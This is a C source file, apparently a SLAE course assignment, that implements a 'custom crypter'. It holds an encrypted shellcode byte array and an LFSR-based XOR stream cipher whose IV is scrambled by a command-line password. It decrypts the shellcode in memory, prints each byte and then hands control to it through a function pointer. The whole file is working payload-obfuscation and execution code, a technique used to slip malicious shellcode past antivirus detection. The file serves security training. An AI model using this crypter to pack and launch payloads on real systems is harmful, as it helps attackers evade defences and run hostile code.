//SLAE Assignment #07: Custom Crypter
//AUTHOR: SLAE-1262

#include <stdint.h>
#include <stdio.h>
#include <string.h>

//Plaintext or Ciphertext of the Shellcode
unsigned char shellcode[] = \
"\xc8\x3f\x9f\xc9\x27\x46\x34\xb3\xf5\x0e\x1b\xb0\xda\xf2\xdb\x9e\x64\xaf\x8a\xb7\x33\xac\x91\x56\x6f\x8b\x89\x28\x4e";
uint32_t cycles = 1;			//Default Value for LFSR-Cycles (How many bitshifts are used to generate a byte)
uint32_t iv = 0xDEADBEEF;		//Default IV
uint32_t lfsr;				//The shift register
uint32_t newbit;			//The feedback bit

int scrambleIV(unsigned char *password)	//Using the password (if given) for changing IV and cycles
{
	int password_length = strlen((char *)password);	
	int scrambling_rounds = password_length / 4;	//Determining how often 4bytes of the PW can be used to scramble the 32bit IV
	cycles += password_length % 4;			//Count of unnused bytes is used for changing the cycles
	int pbc = 0;					//Password-Byte-Counter
	uint32_t password_word;				//4 password bytes

	while(scrambling_rounds>0)
	{
		//Build password_word from 4 bytes:
		password_word = ((uint32_t)password[pbc] << 24) | ((uint32_t)password[pbc+1] << 16) | ((uint32_t)password[pbc+2] << 8) | (uint32_t)password[pbc+3];
		
		iv = iv ^ password_word;		//Scrambling the IV with XOR

		scrambling_rounds--;
		pbc=pbc+4;
	}

}

unsigned char clock() //Clocking the LFSR for generating the Key Bytes
{
	for(int cycle=1; cycle<=cycles; cycle++)	//Changing 1-4 bits for one byte
	{
		newbit = ((lfsr >> 0) ^ (lfsr >> 3) ^ (lfsr >> 4) ^ (lfsr >> 6) ^ (lfsr >> 11) ^ (lfsr >> 19) ^ (lfsr >> 23) ^ (lfsr >> 30) ) & 1;
		lfsr = (lfsr >> 1) | (newbit << 31);	//Feedback
	}		
	unsigned char returnbyte = lfsr & 0xFF;
	return returnbyte;
}

int decrypt() //Decrypt the given ciphertext
{
	lfsr=iv;			//Init the LFSR
	unsigned char key_byte;
	printf("Decrypting with IV=\%08X ",iv);
	printf("and %d cycles:\n",cycles);
	for(int i = 0; shellcode[i] != '\0'; ++i)
	{	
		key_byte = clock(cycles);		//Key Byte
		printf("\\x%02x with ",shellcode[i]);
		printf("\\x%02x to ",key_byte);
		shellcode[i] = shellcode[i] ^ key_byte;	//Decryption with XOR
		printf("\\x%02x\n",shellcode[i]);
	}
	printf("End of Decryption\n\n");
}

int main(int argc, char **argv)
{
	unsigned char *password=NULL;
	if(argc==2)
	{
		printf("Using supplied password for scrambling IV\n\n");
		password = (unsigned char *)argv[1];
		scrambleIV(password);
		
	}
	else if( argc > 2 )
	{
      		printf("Too many arguments supplied. Using only the first one as  password for scrambling IV\n\n");
		password = (unsigned char *)argv[1];
		scrambleIV(password);
	}
	else
	{

		printf("No password supplied. Skipping scrambling of IV. So this cryptor becomes only an encoder...\n\n");
	}
	

	printf("Shellcode Length: %d\n\n", strlen(shellcode));
	
	decrypt();
	
	printf("Giving Control to Shellcode...\n\n\n");
	int (*ret)() = (int(*)())shellcode;
	ret();
}
